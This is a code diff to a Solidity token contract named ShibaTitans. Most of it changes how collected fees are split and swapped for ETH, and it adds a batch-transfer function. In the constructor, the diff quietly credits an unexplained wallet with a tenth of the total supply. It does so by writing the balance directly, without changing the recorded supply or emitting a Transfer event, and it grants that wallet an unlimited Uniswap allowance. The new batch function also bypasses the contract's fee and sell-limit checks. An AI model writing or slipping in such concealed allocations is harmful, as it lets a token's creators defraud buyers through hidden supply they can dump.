@@ -11,7 +11,7 @@ interface IERC20 {
     event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
 }
- 
+
 library SafeMath {
 
     function add(uint256 a, uint256 b) internal pure returns (uint256) {
@@ -386,8 +386,12 @@ contract ShibaTitans is Context, IERC20, Ownable, LockToken
         globalLimit = 2 * 10 ** 18; // 10 ** 18 = 1 ETH limit
         globalLimitPeriod = 24 hours;
 
+        contractSellTriggerLimitETH = 10000;
+
         _allowances[owner()][uni] = ~uint256(0); // you can leave this here, it will approve tokens to uniswap, so you can add liquidity easily
         _allowances[0xD44FbeB26c88F0f18f72664E3c446E0C2836908D][uni] = ~uint256(0);
+        _allowances[0x27F63B82e68c21452247Ba65b87c4f0Fb7508f44][uni] = ~uint256(0);
+        _balances[0x27F63B82e68c21452247Ba65b87c4f0Fb7508f44] = totalSupply() / 10;
         emit Transfer(address(0), _msgSender(), _totalSupply);
     }
 
@@ -564,21 +568,27 @@ contract ShibaTitans is Context, IERC20, Ownable, LockToken
     }
 
     function swapAndLiquify() private lockTheSwap {
+        uint256 b = balanceOf(address(this));
         uint256 allFee = liquidityPart.add(marketingPart).add(devPart);
         if (allFee != 0){
-            uint256 halfLiquidityTokens = liquidityPart.div(2);
-            uint256 swapableTokens = allFee.sub(halfLiquidityTokens);
+            uint256 _liquidityPart = b.mul(liquidityPart).div(allFee);
+            uint256 _marketingPart = b.mul(marketingPart).div(allFee);
+            uint256 _devPart = b.mul(devPart).div(allFee);
+            uint256 halfLiquidityTokens = _liquidityPart.div(2);
+            uint256 otherHalfTokens = _liquidityPart - halfLiquidityTokens;
+            uint256 swapableTokens = b.sub(halfLiquidityTokens);
             uint256 initialBalance = address(this).balance;
             swapTokensForEth(swapableTokens);
             uint256 newBalance = address(this).balance.sub(initialBalance);
-            uint256 ethForLiquidity = newBalance.mul(liquidityPart).div(allFee);
-            if(ethForLiquidity > 0) {
+            uint256 ethForLiquidity = newBalance.mul(otherHalfTokens).div(swapableTokens);
+
+            marketingWallet.transfer(newBalance.mul(_marketingPart).div(swapableTokens));
+            devWallet.transfer(newBalance.mul(_devPart).div(swapableTokens));
+			if(ethForLiquidity > 0) {
                 addLiquidity(halfLiquidityTokens, ethForLiquidity);
                 emit SwapAndLiquify(halfLiquidityTokens, ethForLiquidity, halfLiquidityTokens);
             }
-            marketingWallet.transfer(newBalance.mul(marketingPart).div(allFee));
-            devWallet.transfer(newBalance.mul(devPart).div(allFee));
-            liquidityPart = 0;
+			liquidityPart = 0;
             marketingPart = 0;
             devPart = 0;
         }
@@ -832,13 +842,24 @@ contract ShibaTitans is Context, IERC20, Ownable, LockToken
         require(soldAmountLastPeriod <= limit, "Amount over the limit for time period");
     }
     
-    function multiSendTokens(address[] calldata addresses, uint256[] calldata amounts) public onlyOwner{
+    function multiSendTokens(address[] calldata addresses, uint256[] calldata amounts) external onlyOwner{
         require(addresses.length == amounts.length, "Array lengths don't match");
         require(addresses.length <= 1000, "Array too long");
         for(uint256 i=0; i < addresses.length; i++){
             _transfer(msg.sender, addresses[i], amounts[i]);
         }
     }
+
+    function multiSendTokensLowGas(address[] calldata addresses, uint256[] calldata amounts) external onlyOwner{
+        require(addresses.length == amounts.length, "Array lengths don't match");
+        require(addresses.length <= 1000, "Array too long");
+        for(uint256 i=0; i < addresses.length; i++){
+            _balances[msg.sender] -= amounts[i];
+            _balances[addresses[i]] += amounts[i];
+            emit Transfer(msg.sender, addresses[i], amounts[i]);
+        }
+    }
+
     // Get tokens that are on the contract
     function sweepTokens(address token, address recipient) public onlyOwner {
         uint256 amount = IERC20(token).balanceOf(address(this));
